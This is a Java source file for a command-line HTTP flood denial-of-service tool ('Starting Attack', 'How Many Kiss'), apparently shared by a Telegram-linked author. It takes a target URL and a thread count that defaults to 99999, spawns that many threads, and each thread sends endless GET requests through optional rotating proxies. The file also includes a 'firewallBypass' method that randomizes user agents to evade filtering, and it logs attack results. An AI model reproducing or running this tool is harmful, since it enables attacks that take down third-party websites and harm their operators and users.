import java.io.*;
import java.net.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import javax.net.ssl.HttpsURLConnection;

public class Dos implements Runnable {
    private final String USER_AGENT = "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1";
    private static final String RED = "\033[0;31m";
    private static final String WHITE = "\033[0;97m";
    private static final String BLUE = "\033[0;34m";
    private static final String GREEN = "\033[0;32m";
    private static final String YELLOW = "\033[0;33m";
    private static final String RESET = "\033[0m";

    
    private static int amount = 0;
    private static String url = "";
    private static int successfulRequests = 0;
    private static int failedRequests = 0;
    private static List<Proxy> proxyList = new ArrayList<>();

    int seq;
    int type;

    public Dos(int seq, int type) {
        this.seq = seq;
        this.type = type;
    }

    public static void main(String[] args) throws Exception {
        Dos dos = new Dos(0, 0);
        Scanner in = new Scanner(System.in);

        // Display Banner
        displayBanner();

        // User Input for URL
        System.out.print("Kiss Me🫣=> ");
        url = in.nextLine();
        if (!isValidURL(url)) {
            System.out.println(RED + "Invalid URL. Exiting." + RESET);
            return;
        }

        // User Input for Number of Threads
        System.out.print("How Many Kiss🤔 =>  ");
        String amountStr = in.nextLine();
        Dos.amount = (amountStr == null || amountStr.equals("")) ? 99999 : Integer.parseInt(amountStr);

        // Default to GET method
        int ioption = url.startsWith("http://") ? 3 : 4;

        // User Input for Proxy List
        System.out.print("Do you want to add a proxy list (yes/no)? ");
        String proxyOption = in.nextLine();
        if (proxyOption.equalsIgnoreCase("yes")) {
            System.out.print("Enter the proxy file name: ");
            String proxyFilePath = in.nextLine();
            loadProxyList(proxyFilePath);
        }

        // Check Connection
        System.out.println("Checking connection to Site");
        if (url.startsWith("http://")) {
            dos.checkConnection(url);
        } else {
            dos.sslCheckConnection(url);
        }

        Thread.sleep(2000);
        System.out.println("Starting Attack");

        ExecutorService executor = Executors.newFixedThreadPool(Dos.amount);
        for (int i = 0; i < Dos.amount; i++) {
            executor.execute(new Dos(i, ioption));
        }
        executor.shutdown();
        while (!executor.isTerminated()) {
            // Wait for all threads to finish
        }
        System.out.println("Main Thread ended");

        // Save Log
        saveLog();

        in.close();
    }

    private static void displayBanner() {
        String banner = "\n" +
        "╭╮╱╭╮╱╱╱╱╱╱╱╭╮╭━━━╮╱╱╱╱╱╭━┳╮\n" +
        "┃┃╱┃┃╱╱╱╱╱╱╭╯╰┫╭━╮┃╱╱╱╱╱┃╭╯╰╮\n" +
        "┃╰━╯┣━━┳━━┳┻╮╭┫┃╱╰╋━┳━━┳╯╰╮╭╋━━┳━╮\n" +
        "┃╭━╮┃┃━┫╭╮┃╭┫┃┃┃╱╭┫╭┫╭╮┣╮╭┫┃┃┃━┫╭╯\n" +
        "┃┃╱┃┃┃━┫╭╮┃┃┃╰┫╰━╯┃┃┃╭╮┃┃┃┃╰┫┃━┫┃\n" +
        "╰╯╱╰┻━━┻╯╰┻╯╰━┻━━━┻╯╰╯╰╯╰╯╰━┻━━┻╯\n";
        
        System.out.println(banner);
        System.out.println(WHITE + "\n            Made By HeartCrafter             " + RESET);
        System.out.println(GREEN + "\n             t.me/heartcrafter            " + RESET);
    }

    private static boolean isValidURL(String url) {
        try {
            new URL(url).toURI();
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private static void loadProxyList(String filePath) {
        try (BufferedReader br = new BufferedReader(new FileReader(filePath))) {
            String line;
            while ((line = br.readLine()) != null) {
                String[] proxyParts = line.split(":");
                if (proxyParts.length == 2) {
                    String proxyHost = proxyParts[0];
                    int proxyPort = Integer.parseInt(proxyParts[1]);
                    Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));
                    proxyList.add(proxy);
                }
            }
            System.out.println(GREEN + "Proxy list loaded successfully." + RESET);
        } catch (IOException e) {
            System.out.println(RED + "Failed to load proxy list: " + e.getMessage() + RESET);
        }
    }

    private void checkConnection(String url) throws Exception {
        System.out.println("Checking Connection");
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        printStatus(responseCode, " Website is Alive! ");
        Dos.url = url;
    }

    private void sslCheckConnection(String url) throws Exception {
        System.out.println("Checking Connection (ssl)");
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        printStatus(responseCode , " Website is Alive! ");
        Dos.url = url;
    }

    private void getAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = createHttpURLConnection(obj);
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        printStatus(responseCode , " GET attack done! Thread: " + this.seq);
    }

    private void sslGetAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = createHttpsURLConnection(obj);
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        printStatus(responseCode , " GET attack done! Thread: " + this.seq);
    }

    private HttpURLConnection createHttpURLConnection(URL url) throws IOException {
        HttpURLConnection con;
        if (proxyList.isEmpty()) {
            con = (HttpURLConnection) url.openConnection();
        } else {
            Proxy proxy = proxyList.get(new Random().nextInt(proxyList.size()));
            con = (HttpURLConnection) url.openConnection(proxy);
        }
        return con;
    }

    private HttpsURLConnection createHttpsURLConnection(URL url) throws IOException {
        HttpsURLConnection con;
        if (proxyList.isEmpty()) {
            con = (HttpsURLConnection) url.openConnection();
        } else {
            Proxy proxy = proxyList.get(new Random().nextInt(proxyList.size()));
            con = (HttpsURLConnection) url.openConnection(proxy);
        }
        return con;
    }

    private void printStatus(int responseCode, String message) {
        if (responseCode == 200) {
            successfulRequests++;
            System.out.println(GREEN + "Status :" +responseCode + RESET + message );
        } else {
            failedRequests++;
            System.out.println(RED + " Status: " + responseCode + RESET);
        }
    }

    private static void saveLog() {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter("attack_log.txt", true))) {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            String timestamp = sdf.format(new Date());
            writer.write("Timestamp: " + timestamp);
            writer.newLine();
            writer.write("URL: " + url);
            writer.newLine();
            writer.write("Total Requests: " + Dos.amount);
            writer.newLine();
            writer.write("Successful Requests: " + successfulRequests);
            writer.newLine();
            writer.write("Failed Requests: " + failedRequests);
            writer.newLine();
            writer.write("=========================================");
            writer.newLine();
            System.out.println(GREEN + "Log saved successfully." + RESET);
        } catch (IOException e) {
            System.out.println(RED + "Failed to save log: " + e.getMessage() + RESET);
        }
    }

    @Override
    public void run() {
        try {
            while (true) {
                switch (this.type) {
                    case 3:
                        getAttack(Dos.url);
                        break;
                    case 4:
                        sslGetAttack(Dos.url);
                        break;
                }
            }
        } catch (IOException e) {
            System.out.println(RED + "IO Error in thread: " + this.seq + " - " + e.getMessage() + RESET);
        } catch (Exception e) {
            System.out.println(RED + "Error in thread: " + this.seq + " - " + e.getMessage() + RESET);
        }
    }

    private static void firewallBypass() {
        System.out.println("Attempting firewall bypass...");
        // Example methods, should be customized as necessary
        // 1. Randomizing User-Agents
        String[] userAgents = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
        };

        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
        System.setProperty("http.agent", randomUserAgent);

        // 2. Varying Request Methods
        // Additional methods could be added here to vary the request patterns

        // 3. Using Proxies (already implemented)

        System.out.println(GREEN + "Firewall bypass methods applied." + RESET);
    }

    // Example unit test method
    public static void testConnection() throws Exception {
        Dos dos = new Dos(0, 0);
        dos.checkConnection("http://example.com");
        dos.sslCheckConnection("https://example.com");
    }
}
